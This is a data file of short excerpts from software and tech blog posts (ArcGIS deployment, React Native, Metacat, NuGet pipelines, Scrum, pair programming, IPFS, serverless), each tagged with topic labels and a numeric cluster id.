3121,"Now that the service is running, it is time to configure the Arc GIS Datastore. Navigate your browser to this address: When you get there, you will be asked to provide the address of your Arc GIS Server and credentials. Use their example to point the datastore to localhost:6443. Check both relational and managed in the options that follow. Use Geospatial in case there is a Geo Event server present in your deployment, and the server is processing real-time information. Once done, the Datastore will point you to federate your server with Portal for Arc GIS and select it as the Portals hosting server. Before we do that, there are still some checkpoints in our journey.","['AWS', 'Arcgis', 'Servers', 'Esri', 'GIS']",11
3122,"The portal is probably the one piece of software that caused me the most problems. To access it for the first time, you need to navigate your browser to: The portal will ask you to create an Administrator account. Choose a name and password, just like before save them for later, and submit. Then, the Portal will point you to installing the Web Adaptor and mention that it wont be accessible until you configure it. This phase is where things can get tricky. You dont necessarily need the web adaptor. You dont necessarily need the portal. If youre only hosting map servers, Image Layers, and feature servers, you dont need the Portal at all. You do need it in case of Vector Tile layers and hosted Feature layers among other types of Hosted layers.","['AWS', 'Arcgis', 'Servers', 'Esri', 'GIS']",7
3123,"There are two Web Adaptors well be using. One for the portal and the other for the Arc GIS Server. Both of them are present in the IIS folder. Search for IIS manager in the start menu search bar and launch the appropriate app from the results. Youll see the server is down. The reason for this is that a service has been disabled. When you try to click on start, it will give you the name of the service not functioning. Search for that service in the IIS manager. Theres a list of them at the bottom of the window. Similar to the services we modified earlier, change this one to automatic as well and start it.","['AWS', 'Arcgis', 'Servers', 'Esri', 'GIS']",7
3124,"Once done, navigate your browser to: This address points to the configuration page for the first web adaptor. Just verify it is loading up. We are going to enable SSL before we do anything else. In the IIS Manager, right-click the default web site category in the left pane. Add a new binding there for port 443. Dont add anything else other than the port. It should be similar to how port 80 appears there. In the certificates dropdown, select the one that is already there. It is a self-signed one and can be safely ignored for now. After configuring that binding, try to access this address. The same as before only from SSL: If this is working, then you may proceed with setting the server web adaptor. You will need your administrator credentials and the ported URL (localhost:6443). Fill in all of the details and submit. If all goes well, a green message box will inform you that you can access your server from the web adaptor address.","['AWS', 'Arcgis', 'Servers', 'Esri', 'GIS']",7
3125,"Updating the Portals web adaptor will be a bit different. I dont know if this is a bug, you may correct me in the comments: using localhost:7443 for the Portal URL is not working. The portal URL expects to see a fully qualified domain name. The workaround is to use your DNS name for the portal URL, relying on the fact that you can access the portal externally (we exposed port 7443 earlier). After this is complete, you will need to update the portals Web Context URL property by doing the following: Navigate to this address: From the options that are available to you, click on system. From the new options, click on Properties. There you will see an empty JSON {} with a link to Update Properties.","['AWS', 'Arcgis', 'Servers', 'Esri', 'GIS']",7
3126,"Before moving on, Im going to assume something about you, the reader: Your workplace does not have its own Certificate Authority, like in big corporations. Also, you rely on a bought certificate or a Lets Encrypt certificate in your online services. Were going to work with the latter. You will need three CSR files. One from IIS Manager, one from the Server and one from the Portal. Follow these steps to generate them: IIS Manager Select your computer in the IIS Manager.","['AWS', 'Arcgis', 'Servers', 'Esri', 'GIS']",7
3127,"The not quite finalized list: Building a Mobile App in 10 Days with React Native Building a Node API with Express & Google Cloud SQLEasy React Native Authentication: Auth0React Native: Barcode Scanning & Autocomplete Using Air Bn Bs Lottie Animations with React Native Deploying a React Native App to the App Store & Google Play My friend Connor Maddox and I built this app together. Hes an embedded systems engineer with Boeing and I lead the product team at Realeflow, a real estate investor Saa S company. That is to say, if you see something that could be improved, please feel free to let us know! We *actually* built the app in 10 days. We had to learn a lot within a short period of time but we had an incredibly good time doing it. I primarily handled the i OS side, while Connor did the Android part. A lot of pizza and beer were consumed (Leinenkugel grapefruit shandy is life! )You can find the app here for i OS and here for Android. Quick note: the app available on the App Store / Play Store is not the 10 day version. We have continued to push updates and are trying to make the product better.","['React Native', 'React', 'Mobile App Development', 'Mobile Apps', 'Books']",6
3128,"Now, I hate to step into controversy right out of the gate, but you have a decision point right when you start creating a react native project. Use the Create React Native App B. Essentially, react-native init Awesome Project The difference between these two paths is laid out a bit confusingly on the Get Started documentation. What it boils down to is whether youre building your React Native project with Expo or not. Expo is a toolchain that was baked into the create-react-native-app library that removes some barriers up front, but in our own experience, adds barriers on the back end.","['React Native', 'React', 'Mobile App Development', 'Mobile Apps', 'Books']",18
3129,"In our app, we have five main screens Bookcase Explore Add Book Lists Profile To get started, well stub those out with placeholder text: Once we have those five screens set up, we can get the first part of our navigation createdthe tab navigation at the bottom of the screen. Were going to be using the React Navigation library. Well add a __url__ file to the root of our app folder and then install a couple of libraries:npm install react-navigation --save React Native Elements for icons & such. Follow the react-native-elements install instructions here You should now have something that looks like this: Now that we have the bones in place, the fun part starts. Well save the dynamic data part for a future blog post and use a static data object to build out a list of books. For our initial bookcase display we only need a couple of data points: id, title, author, and thumbnail.","['React Native', 'React', 'Mobile App Development', 'Mobile Apps', 'Books']",6
3130,"The minimum supported i OS version should be clarified at the beginning of the project as well. For example, consider the following scenario: You need to develop an augmented reality app. You pick ARKit, develop everything and send the app for testing to the client. However, they cant install the app. Their device is i Phone 6 with i OS 10 installed. You can ask them to install i OS 11, which already raises eyebrows since the customer will rush to check whats the OS versions distribution on the market. And i OS 10 is only 2 years old, which reduces the market size for the app.","['iOS', 'Requirements', 'Software Architecture', 'Software Development', 'Mobile App Development']",16
3131,"Knowing the business side and intentions of the app are crucial for the success of the project. You need to understand whats the goal of the client to develop that app. This is important for defining the appropriate architecture of the system. For example, lets say the client wants to sell the app as a white-label product to other businesses, with different pricing for different features. This means that you should design the system to make it really easy to turn on and off the features. It also means that styles, fonts, and images should be easily replaceable.","['iOS', 'Requirements', 'Software Architecture', 'Software Development', 'Mobile App Development']",19
3132,"by Ajoy Majumdar, Zhen Li Most large companies have numerous data sources with different data formats and large data volumes. These data stores are accessed and analyzed by many people throughout the enterprise. At Netflix, our data warehouse consists of a large number of data sets stored in Amazon S3 (via Hive), Druid, Elasticsearch, Redshift, Snowflake and My Sql. Our platform supports Spark, Presto, Pig, and Hive for consuming, processing and producing data sets. Given the diverse set of data sources, and to make sure our data platform can interoperate across these data sets as one single data warehouse, we built Metacat. In this blog, we will discuss our motivations in building Metacat, a metadata service to make data easy to discover, process and manage.","['Big Data', 'Metadata', 'Hive Metastore']",8
3133,"At a higher level, Metacat features can be categorized as follows: Data abstraction and interoperability Business and user-defined metadata storage Data discovery Data change auditing and notifications Hive metastore optimizations Multiple query engines like Pig, Spark, Presto and Hive are used at Netflix to process and consume data. By introducing a common abstraction layer, datasets can be accessed interchangeably by different engines. For example: A Pig script reading data from Hive will be able to read the table with Hive column types in Pig types. For data movement from one datastore to another, Metacat makes the process easy by helping in creating the new table in the destination data store using the destination table data types. Metacat has a defined list of supported canonical data types and has mappings from these types to each respective data store type. For example, our data movement tool uses the above feature for moving data from Hive to Redshift or Snowflake.","['Big Data', 'Metadata', 'Hive Metastore']",8
3134,"As consumers of the data, we should be able to easily browse through and discover the various data sets. Metacat publishes schema metadata and business/user-defined metadata to Elasticsearch that helps in full-text search for information in the data warehouse. This also enables auto-suggest and auto-complete of SQL in our Big Data Portal SQL editor. Organizing datasets as catalogs helps the consumer browse through the information. Tags are used to categorize data based on organizations and subject areas. We also use tags to identify tables for data lifecycle management.","['Big Data', 'Metadata', 'Hive Metastore']",8
3135,"Metacat, being a central gateway to the data stores, captures any metadata changes and data updates. We have also built a push notification system around table and partition changes. Currently, we are using this mechanism to publish events to our own data pipeline (Keystone) for analytics to better understand our data usage and trending. We also publish to Amazon SNS. We are evolving our data platform architecture to be an event-driven architecture. Publishing events to SNS allows other systems in our data platform to react to these metadata or data changes accordingly. For example, when a table is dropped, our S3 warehouse janitor services can subscribe to this event and clean up the data on S3 appropriately.","['Big Data', 'Metadata', 'Hive Metastore']",6
3136,"Continuing on our journey from __url__ monolith __url__ core microservice and getting practical about code. When we were developing a monolith things were easy (to start with right!) because it was a single solution. All of our common code just lived right there in the solution with all the other projects that used it. But now were creating our separate solutions for our separate microserviceswhere does all this stuff go now? Our base classes for services, our base classes for our processes, our useful utilities etc the simple answer, and the nice answernuget! Lets pre-build them and publish them as nuget packages.","['Azure', 'Nuget', 'Debug', 'Pipeline', 'Dotnet Core']",19
3137,Give your pipeline a useful name and select an agent pool. Were now ready to start adding our build jobs. Lets go through them one by onebut first add the four jobs by pressing the + button on the Agent Job 1 task placeholder.,"['Azure', 'Nuget', 'Debug', 'Pipeline', 'Dotnet Core']",18
3138,"Restore: This task pulls down any nuget dependencies our project may have so that our code can be built. As you will have noticed, for us currently its redundantbut in most cases it wont be. So rather than ignore this I thought it more helpful and complete to include it. First rename the step to dotnet restore, then select the restore command from the drop down. Finally select which feed within the Azure Artifacts to pull from. In my case I have packages which use other packages, so I select the same feed from this drop down that we created earlier, as thats where I publish packages to.","['Azure', 'Nuget', 'Debug', 'Pipeline', 'Dotnet Core']",18
3139,"you can save and queue and build now and itll build and push your package to your feed! Version numbers are something to be mindful of here. Once a package version number is used thats it, you cant reuse it. Thats good when you think about it However, if you try and run your build a second time youll notice itll fail when pushing to the feed. If you look at the details youll see its failing because theres already a package in the feed with that version (1.0.0 right?). To change your version you need to go back to visual studio, project properties, package tab and Package Version. Updating this to 1.0.1, commit and push, will result in a successful build next time. If youve followed the debug instructions below, remember its actually the nuspec file that now owns this.","['Azure', 'Nuget', 'Debug', 'Pipeline', 'Dotnet Core']",18
3140,"Jump back to Azure Dev Ops and select the Artifacts tab on the left. Now at the top, next to the New Feed button we clicked earlier is a Connect To Feed button. Clicking this will bring up the dialog which contains the Package Source URL you need back in Visual Studio. Click the handy copy to clipboard button, then back to visual studio, paste the value into the Source text box. You can now drop down the Package Source drop down and youll see your new feed. When you select it, and have browse selected on the left, youll see your Compression package appear. Thats all there is to it! To debug your package there are a number of things to do. However as these packages are only for teams within my organisation I found the simplest thing to do was simply to share the pdb and source code files within the package itself. This means when someone adds this package to their project, within __url__ directory theyll receive the pdb and source code which enables the attached debugger to automatically step into the packaged code. So, heres how to: Firstly Azure is helping us by creating a nuspec file, which tells nuget what the contents of the package should be, what version it is, what dependencies it has etc Well to put the pdb and source in there too well need to explicitly create and share the nuspec file ourselves instead.","['Azure', 'Nuget', 'Debug', 'Pipeline', 'Dotnet Core']",7
3141,"Create a file called compression.nuspec in the root of your project with the following content. Ill explain it right after: As well as adding the nuspec file we also need to reference it from the project file itself. Right click and edit the project file and add the following line to the top Property Group section: Looking back at the nuspec file, were using two main sections: Metadatathis is the details of the package itself. It contains some mandatory elements which you must enter values forthese are the present elements. The example also shows the dependencies section. These are the dependencies of your project, and their versions. Ive left examples in there for illustrative purposes but refer to the nuspec guide [LINK] for more information. This would have been automatically generated for us previously.","['Azure', 'Nuget', 'Debug', 'Pipeline', 'Dotnet Core']",18
3142,"The second section is the files sections. This is where we differ from what would have been previously generatedand rightly so. We wouldnt want default behavior of shipping out our source code as well as our dll right? (although, its pretty easy to get back to source code from the binary, sometimes even if it is obfuscated). So whats happening here is were saying we want everything from our build output, dlls, pdbs, everything. Were also saying we want all of __url__ files too. All cs files will now be included in our package. This includes assembly Info which we could write an exclusion forbut to keep this simple Ive omitted any further complications for now.","['Azure', 'Nuget', 'Debug', 'Pipeline', 'Dotnet Core']",18
3143,"Manually configuring the nuspec file feels like swimming against the tide rather than configuring stuff in the project properties However, if you instead push symbols up to the Azure Symbol Server you still need to provide the source code as the portable PDBs dont currently support Source Indexing. That then could cause issues debugging things of various versions etc unless you continue packaging the code. Its possible to use a custom Azure Pipeline step to package the symbols as well as the main package but they use a common Id so the VSTS feed rejects the symbols packagebut even if it did accept it the fact were portable means youd still not get code Soimprovements? When portable PDBs support Source Indexing then itll be worth looking again at either those custom build steps and/or the Publish Symbols task. Ill look further at a conditional build based on Build Configuration, which could allow production of release packages without PDBs and source while leaving a debug version to continue packaging them. Ill post as and when Also if the package has internal structure this posts approach will fail; youd need to switch to using Content for your source files in the nuspec file where you have access to flatten them so the debugger will find them automatically.","['Azure', 'Nuget', 'Debug', 'Pipeline', 'Dotnet Core']",18
3144,"What the next step is would be determine by the users. For example, the next step could be users want to see more photos of the products; in that case, we could consider implementing multi-images with slider, and a zoom function. Perhaps, it is possible the users are already satisfied with a simple catalog. On the other hand, the user may find the payment method is not convenient. hence, we might start the shopping cart and payment development. Always remember, each new feature should start with a basic version. We would release each feature upon development completion. We would get feedback from the users, and then development enhancement would be based on feedback collected.","['Agile', 'Scrum', 'Kanban', 'Scrumban', 'Scrum Master']",6
3145,"First of all, in a Scrum project, it is about story points and sprint planning. Story points will become meaningless when the team is more and more familiar with their capacity and the project. However, if Everybody just sit there and give points to stories without even thinking in detail. It then comes to another problem with Sprint concept itself Say we have a 2-weeks sprint, and our scheduled deployment is at the end of each sprint cycle. Imagine just right after the start of a sprint cycle, the Product Owner discovers there is an urgent task that reflects the current market and needs to be launch immediately, what can he do? According to the Scrum rule, he will have to wait until next sprint cycle, and get that task deployed at the end of next sprint, which is almost four weeks. This timeline would not be acceptable to the users, so his only choice is to throw in a new story in the middle of the sprint. This action will upset the engineers for sure.","['Agile', 'Scrum', 'Kanban', 'Scrumban', 'Scrum Master']",1
3146,"In the sprint planning, we need the full team to be there, otherwise it would only be the Product Owner and the senior engineers discussing the user stories. The others would need to understand the stories afterwards, and possible message gets lost in translation. Another critical problem would be about the product quality. Most of the stories development will finish near the end of the sprint cycle, QA engineers does not have enough time to conduct detail testing. Plus there could be some planned stories that has not been done yet, and engineers will use the dirty way to get it done. In that case, there could be even more pressure adding up for QA engineers. Since they will need to spend more effort, time and resources to test the rushed work. Even worse is that this will stack up more and more technical debt.","['Agile', 'Scrum', 'Kanban', 'Scrumban', 'Scrum Master']",1
3147,"In the past few years, the way work is done in companies has changed radically. Suddenly, planning and subsequently carrying out work was not good enough. Long gone were the days of waterfall, where work was planned out monthsor even yearsahead, and carried out by horses with blinders on, completely oblivious to their ever changing environments.","['Agile', 'Software Development', 'Scrum']",12
3148,"The word agile was chosen very meticulously. Theres this inherent goodness to the word. It is something you want to do, even if you dont fully understand what it entails. And it worked, because in 2018, there are a whole lot of organisations and teams working agile.","['Agile', 'Software Development', 'Scrum']",12
3149,"The frequency of task management and random bookkeeping imposed by Scrum is almost always detrimental to the amount of work done. More so, it implies a lack of trust. Nearly all developers I have ever worked with use some sort of mechanism to track their work. Some use plain old pen and paper, some wrote their own tool in their spare time, and some of them use a specific product for it. The most important thing is they use what fits their workflow.","['Agile', 'Software Development', 'Scrum']",12
3150,"Well, there are a lot of options. But you are in a rush to satisfy the big batch of customers you just signed, so you need to find a balance between perfect and done. After some discussions, lets say you decided to build another system to perform some ETL work that gets the job done. That system will need to have access to all the read replicas that contain the information you need. The figure below depicts how such a system could work.","['Data', 'Data Science', 'Microservices', 'Tech', 'Unb Data']",0
3151,"From personal experience, I believe this approach works for a while, at a certain scale. At Unbabel, it served us pretty well until recently, when we started facing some challenges. Some of the things that caused us some headaches were: One of the biggest advantages of microservices is encapsulation. The internal representation of the data can change and the systems clients are not affected because they communicate via an external API. However, our strategy required direct access to the internal representation of the data, which means that every time a team made a change on the way data is represented (e.g. renaming a field or changing a type from text to uuid), we had to change and deploy our ETL service.","['Data', 'Data Science', 'Microservices', 'Tech', 'Unb Data']",10
3152,"The Apollo graph QL server provides a callback function which is triggered every time our resolver runs into an Exception. Together with Googles Stackdriver Error Reporting library we can send our own error reports to the Google Cloud API every time something unexpected happens. It is important to note that all Apollo errors are wrapped in a Graph Ql Error object, however our original error is still available inside the original Error property of the error provided by the Graph QL server. As we introduced our own error class before, it is now possible to implement a different reporting behavior for our specific case: Lets query our resolver again inside of Google Cloud until we see our simulated exception. Checking our App Engine logging now shows a /stderr category and our error log message. We could now create a metric and alarm policy to get informed about errors happening in our graph QL implementation.","['GraphQL', 'Google Cloud Platform', 'Monitoring', 'Bugs', 'Apollo']",11
3153,"Dont be satisfied with writing a few happy-path unit checks. Employ robust testing methods such as mutation testing and property-based testing as appropriate. You might be surprised at how many holes these tools can find in your unit test suite. It is perfectly okay if you write ten times as much test code as production code. There is a risk of writing some redundant test cases, but it would be far worse to overlook something important. Err on the side of overdoing it.","['Software Development', 'Tdd', 'Coding', 'Software Testing', 'Programming']",13
3154,"An AI-based client would very likely operate in a different way. It could explore the behavior and reliability of all the available services pertaining to invoices. It might determine that Service A is highly dependable for the function of adding line items to an invoice; Service B is dependable for calculating sales tax; and Service C is dependable for applying customer loyalty rules. It decides to invoke specific APIs exposed by different services for each function, based on empirical data regarding performance to promise in the near-term past. Which services are most likely to fulfill their promises? Maybe not the same ones today as yesterday, or in the last sliding 10-minute window.","['Software Development', 'Tdd', 'Coding', 'Software Testing', 'Programming']",10
3155,"My friend (and software startup coach) Mike Borthwick recently wrote on Linked In: I often find myself creating the first or second artefact a new business will ever create. One day I was putting a new piece of art my son created in kindergarten on the fridge. It occurred to me that the piece I was taking down to make room was the first one we ever put up. I think a lot about motivation and how we dont keep track of progress day-to-day or month-to-month until something unexpected happens and were suddenly forced to recognise our progress. I have started advising my clients to take their first storyboard, frame it, and hang it on the longest wall in their apartment, house, Vanagon I grew up as a software developer in the late 80s and 90s. Software engineering was in its infancy; methodologies like agile or scrum had not been invented and best practices in software development were few and far between. One of the practices that we started implementing in my programming days was the so-called post mortem; an exercise at the end of a project to try and learn what had worked, what not and what we could do better next time.","['Productivity', 'Life Lessons', 'Business', 'Entrepreneurship', 'Startup']",2
3156,"Now we can change up our original function to look like this: It is a bit heavier, but it holds all of the builder functionality into one spot. It hides the implementation from our calling spot and allows us to write code like this: Boom! Thats the exact code I was looking for from the beginning of this article! Since everything is sort of repeatable, Im going to show you how the rest of the code is possible without too much explanation. If there is anything that looks wrong, point it out to me in the comments. The rest of the article is going to be code from here on out, thanks for sticking with me and Ill see you next time. (After getting everything to work I decided to Google if someone had already written something like this. It looks like there is a Github repo here __url__ implementation.","['Kotlin', 'Android App Development', 'AndroidDev', 'Programming', 'Software Development']",15
3157,"For every row in the payments table we created two rows in the movements table: one for the sender and another for the recipient. There was a lot of code that would be impacted by this migration! The Cash App uses Hibernate for most of our interaction with My SQL. We use a Db prefix in our entity classes, like Db Customer, Db Card, and Db Payment. In addition to creating a Db Movement for our new table, we also needed an abstraction that would bridge the two models. I called it Da Payment and entertained my teammates with goofy questions like where da payments at? when they asked about the name.","['Engineering', 'Hibernate', 'Java', 'MySQL', 'Vitess']",8
3158,"Having a comprehensive test suite was essential to making the migration safe. Early on in the migration we built confidence when a few tests ran to completion in the new world. We annotated these tests @Works On Movements and configured our build infrastructure to run these tests twice, once under phase 1 and again under phase 4. We made progress by finding unannotated tests and filling out the movements codepaths until they passed. Later we replaced the @Works On Movements allowlist with a @Does Not Work On Movements denylist and started to count down to a fully-ready system. Once all of the tests worked on movements we were ready to migrate.","['Engineering', 'Hibernate', 'Java', 'MySQL', 'Vitess']",10
3159,"Some Google Cloud customers have a very large amount of static content that they wish to serve to users. Typically, lots of video and image media with some text. They want a solution that is: Easy to update content Reliable Fast Mobile friendly Options for serving web content on Google Cloud Platform (GCP) are summarized in the page Serving Websites. For this use case, Google Cloud Storage (GCS) is a great choice. It is easy to update content in GCS with the gsutil command line utility and client APIs. It is very reliable, having a 99.95% SLA. Having addressed the top two requirements by choosing GCS, this document will discuss how to optimize for speed and mobile friendliness using Google Tools for Web, Developers, including Chrome Dev Tools and Lighthouse. An accompanying gist provides code to test the serving of a static web site with GCS, addition of a load balancer for serving via HTTPS, and development of Java Script for making content available offline and collection of performance data, as experienced by your users.",['Google Cloud Platform'],17
3160,"The top item on the list is Does not respond with a 200 when offline. You can enable a static website to be accessed offline by using a Service Worker to cache and retrieve the content in the browsers Application Cache. The __url__ and __url__ files in the gist implement this. Also, this the third item on the Lighthouse audit list: Does not use HTTPS. So our first priority will be to enable HTTPS.",['Google Cloud Platform'],11
3161,"You can collect timeing data in browsers with Java Script using the Navigation Timing API. For example,This is demonstrated in the Java Script file __url__ in the gist, which is loaded from index.html. From the browser you may post the data back to your server to store. The example so far is a static site hosted on GCS but you will need a dynamic handler to receive and save the data. You can do this by adding a GCE instance or Cloud Endpoint, or Google Kubernetes Engine cluster behind the load balancer. A rough diagram of this is shown below.",['Google Cloud Platform'],11
3162,"Ive read about Ping Pong Pair Programming as far back as 2002. However, I didnt begin to practice it until I joined an e Xtreme Programming (XP) team. I quickly took to the practice, finding it incredibly engaging and enjoyable. As someone who values collaborating with other developers this was collaboration at a level I had not previously experienced. Furthermore, this constant and close collaboration built a camaraderie with a team of developers which I have not been able to replicate since. There are about eight to ten developers with whom Ive worked that I feel an incredible bond with as a result of constant pair programming over a significant period of time. These are folks I would jump at the chance to work with again.","['Software Development', 'Pair Programming', 'Extreme Programming', 'Software Engineering', 'Tdd']",2
3163,"Another very important aspect of pair programming is how the pair of developers are seated in relation to one other. The worst way to sit while pair programming is one developer in front of the other sharing the same monitor. Both developers need to be comfortably seated and able to take control of the computer at any point in the pairing process without any additional effort. The most common seating arrangement is two developers seated next to each other. While I dont find this to be the optimal seating arrangement, it is usually the easiest in work environments that werent designed with pair programming in mind. I do however find myself resorting to it more often than Id like to.","['Software Development', 'Pair Programming', 'Extreme Programming', 'Software Engineering', 'Tdd']",0
3164,"Given that conversations are constantly happening in the pairing session this is a very natural way to incorporate mentoring into your team. This type of mentoring is more effective than mentoring sessions between developers and managers in private one-on-one meetings. Dont get me wrong, you should be having one-on-one meetings with your manager, but the real mentoring should be happening while building the software. By pair programming, mentoring is something that is occurring constantly and naturally between developers of different skill levels. Additionally, learning new techniques, 3rd party libraries, tools, team practices, team coding conventions, etc. becomes very easy and built-in to the pairing process.","['Software Development', 'Pair Programming', 'Extreme Programming', 'Software Engineering', 'Tdd']",0
3165,"I am a huge advocate of TDD. I have had a lot of success with it and I have yet to find a situation in which I do not want to utilize it. Test-Driven development, while conceptually simple, takes a fair amount of time for developers to get truly comfortable with. There are some common struggles that developers new to TDD experience. These include: Not doing the simplest thing to make a test pass Taking too big of a step Writing integration tests instead of unit tests Even the act of just writing the test first is something that is a challenge for developers who havent worked that way previously. All too often unit tests that inexperienced developers write are impossible to maintain, impossible to reason about, and end up being an opposing force instead of an enabling force in the organization. These are situations where teams give up on unit testing and decide it didnt work for us. See one of my previous posts for more on this topic, x Unit is Not Unit Testing.","['Software Development', 'Pair Programming', 'Extreme Programming', 'Software Engineering', 'Tdd']",13
3166,"When I first started Ping Pong Pair Programming we switched pairs on the team twice per day (two four hour sessions). In the early days of XP teams tended to keep the same pairs throughout an iteration. Switching pairs regularly has several benefits over keeping pairs together for the duration of an iteration. It alleviates the need for code reviews (as mentioned previously) and it spreads knowledge throughout the team very quickly. In my experience, every developer on the team paired with one another, thus there were no favored pairs. Very rarely would a user story be completed in a single pairing session, this resulted in a true team-owned solution and team accountability for the success of every user story.","['Software Development', 'Pair Programming', 'Extreme Programming', 'Software Engineering', 'Tdd']",1
3167,"Youve probably heard IPFS referred to as the permanent web, or the immutable web. This is a big idea an immutable store of all the worlds information. It all ties back to the idea of content addressing, which weve talked about before on this blog. To refresh your memory: the immutability of content on IPFS gives us nice things, like de-duplication of data (because the same content from different peers will produce the same hash address) and content verification (so we can be confident that content has not been modified if its hash matches what we were expected/requested). This means nobody can add malicious code on its way to my peer (no MITM attacks here). Heres a great video that explains a lot about how the immutability of IPFS is implemented.","['Rest Api', 'Decentralization', 'Immutable', 'Tutorial', 'Software Development']",11
3168,"Now, a permanent or immutable web is all well and good, but its often not very practical for dynamic content. What about things that change like websites, blogs, social media, and well, pretty much all the services we currently enjoy on the web today? For that, we have IPNS, the Interplanetary Name System. So what IPNS lets us do, is add immutable content, and then update a pointer to that content so that even though the underlying content might change, the way we link to it does not. This is essentially like a self-certifying file system, which maintains some of the niceties of content verification (you know you can trust my IPNS link because you can verify that I am the one that published it using my Peer ID) but adds the niceness of mutable references. This way, I can update my website without having to have everyone change the CID they use to access it. Basically, a global namespace based on Public Key Infrastructure (or PKI) which allows us to build trust chains (so you can follow a public key to its route peer), giving us encryption and authentication, and is still actually compatible with other name services. So for example, we can even map things like DNS entries, onion, or bit addresses, etc. There are now several examples to do these types of things, so it works already.","['Rest Api', 'Decentralization', 'Immutable', 'Tutorial', 'Software Development']",19
3169,"Having said that, IPNS (like much of the decentralized web) is still a work in progress. It is still quite slow, and not all IPFS implementations (namely, the Java Script version) fully support it yet (though there is actually a PR that should make it into the next release). But, it is usable in many contexts, so lets start with a simple example right now Say I wanted to share information about myself with various (preferrably, decentralized) web-services? But, I want full control of this information, so that I know what information Im sharing, and I can decide what I do and do not want various services to know about me. In other words, not how things work for the most part in our current centralized web. Anyway, to share this information programmatically, maybe Id create a simple RESTful API for services to access? Id include things like name, birthday, social media links, work info, etc., and probably serve it up as JSON or something. Now, I can already do this quite easily using IPFS: just add a JSON doc with the right info from my peer, and view it online.","['Rest Api', 'Decentralization', 'Immutable', 'Tutorial', 'Software Development']",10
3170,"Now, when I visit __url__ for.","['Rest Api', 'Decentralization', 'Immutable', 'Tutorial', 'Software Development']",17
3171,"This sounds really good to people like me who strongly advocate small, concise, pull requests over long-living feature branches. But its not the same thing. Sprints encourage features over tech debt. How often have you had to advocate spending an entire sprint tackling tech debt? What would happen if we didnt plan every week, didnt do retros, and didnt do standup? Stop doing standup Standup has always bothered me. It usually serves to interrupt developers, make them feel pressured to prioritize features over tech debt, and has been known to last longer than 1/2 hour.",['Agile'],1
3172,"A lot of things are easy in theory but are much harder in implementation and AWS Lambda, and serverless development as a whole, is no different. Understanding the architectural concepts behind building a serverless system is relatively easy. Just recently I wanted to build a service to publish AWS Health Cloud Watch events to a Slack channel. Its relatively easy to picture as an AWS Cloud Watch event that triggers a Lambda which publishes to Slack. But, how does one go from this simple idea to building and deploying it? One question Ive seen come up multiple times is what should an AWS development workflow look like? How do you build and iterate quickly? Individual engineers struggle with this when learning new technology. How do I solve tasks I already know how to do? (At the organizational level, organizations struggle to coordinate all their individual developers but thats a blog post for another time.) I struggled with these issues too when I started with Lambda. Over time I learned more tools and techniques, and experimented with different workflows to make myself more productive. While building my first serverless training workshop to teach others I was forced to take a long look at what habits I had that worked, what didnt, and define the best practices I had found.","['AWS', 'Serverless', 'Development']",10
3173,"I published these services from this series to AWS Serverless Application Repository (SAR). You can deploy these services to construct your own serverless application to deliver AWS Health notification messages to Slack. In addition, if you write a service that can take in data and format it as a Slack message which is then published over AWS SNS, you can even reuse my aws-sns-to-slack-publisher service in your own very different application. You dont have to bother building that! This is something that gets me greatly excited about serverless. Nanoservices are reusable code and infrastructure that can be versioned and deployed to construct usable applications. Theyre a sort of a cross between a microservice and a programming library.","['AWS', 'Serverless', 'Development']",11
3174,"My background is as non-technical as it can be. I have been in school for a decade now. I have a Masters degree in International Studies and foreign languages. I have never taken a Maths course in college either, which I now regret. For my entire life, I firmly believed that I am no good in sciences, as if there is an innate trait of character that makes me unfit to be good in STEM. I dont disagree with the notion that some people excel in certain disciplines better than in others, but there is nothing stopping them from learning something different. I realized this way too late.","['Programming', 'Coding', 'Code Newbie', 'Careers', 'Learning']",2
3175,"In this article, I want to talk about the journey of trying to become a programmer by studying on your own. A lot of the times I read stories of people that successfully changed careers by devoting a certain amount of time every day to learn to code. Eventually, they left their unfulfilling job and got hired for the dream jobs. What I want to share in this article is the hardships of going through the journey on your own. How many of you spend hours figuring out seemingly simple concepts? How many times do you question why you are doing this? And when you actually solve the problem, you have no clue how you solved it. I want people who are in the same boat as me to feel that they are not alone, that others feel lost as well.","['Programming', 'Coding', 'Code Newbie', 'Careers', 'Learning']",2
3176,"Back in summer 2017, when I was on a summer break from school, my boyfriend suggested I learn coding. At the time I did not have a clue what coding entailed or what you can create with it. I signed up for Codecademy and slowly finished HTML, barely started CSS, and then quit. Due to a chain of events, I did not pick up coding for the next few months. Fast forward to October 2017, when I was unemployed and was not attending classes. I felt completely lost and scared about my future. It is then I decided to explore things that I was passionate once but buried them far away. That includes learning foreign languages, reading books, working out, etc. Somehow I ended up back on Codecademy, which lead me to Khan Academy. This time I got HTML and CSS down, started a little bit of Java Script, but I got lost quick. Instead of giving up, I went on a research mission. I was scrolling through Reddit and stumbled upon a mention of Harvards CS50 course on Ed X. I immediately jumped on it. Listened to an hour-long lecture and was completely hooked. Professor David Malans energy was contagious. I wanted the same excitement talking about my favorite subjects to a roomful of students. However, when it came to problem sets, I didnt even know where to begin. After all, I did not know any programming language, and the course started with C. My next quest was to get a better foundation in the programming language logic.","['Programming', 'Coding', 'Code Newbie', 'Careers', 'Learning']",2
3177,"After another long research, I found Free Code Camp. It greatly focused on Java Script that I was not comfortable in either. You would think with that much jumping around, I would have given up. I was motivated than ever before. Eventually, I settled on learning Python, using a Georgia Tech course on Ed X called Introduction to Computing Using Python with Professor David Joyner. Thus I spent the next 4 months learning about simple data types all the way to sorting algorithms. It would have taken me less than 4 months, but in the middle of that I received a Grow with Google Challenge Scholarships for Front End Development, and later became a recipient of Phase 2 scholarship for Front End Nanodegree on Udacity. I have also received a scholarship for Self-Driving Car Nanodegree on Udacity, and Google IT Support Award on Coursera. I always tried to stay away from online classes in school because of how much independence and self-discipline is required to succeed.","['Programming', 'Coding', 'Code Newbie', 'Careers', 'Learning']",2
3178,"My grand goal for this article was to give some impressive abstract advice, but I dont really have any. If anything from what I wrote somehow resonates with you or consoles you, then I am happy. I might never become a programmer and coding might just stay my hobby forever, or I might find a software developer job in a big company and live my best life. What I do know, however, is that I get an immense pleasure from building websites, solving coding challenges, and progressing to more advanced topics. Coding gave me an appreciation for all the hard work that software developers put in the technology that we mindlessly use every day. It also broadened my mind and had me thinking about how I connect programming/technology with Area Studies. If anything I am more active now on campus networking with more people and student organizations. Find joy in what you are learning, and the rest will follow. *Connect with me on Linked In: __url__ https://sseidmed.github.io/.","['Programming', 'Coding', 'Code Newbie', 'Careers', 'Learning']",2
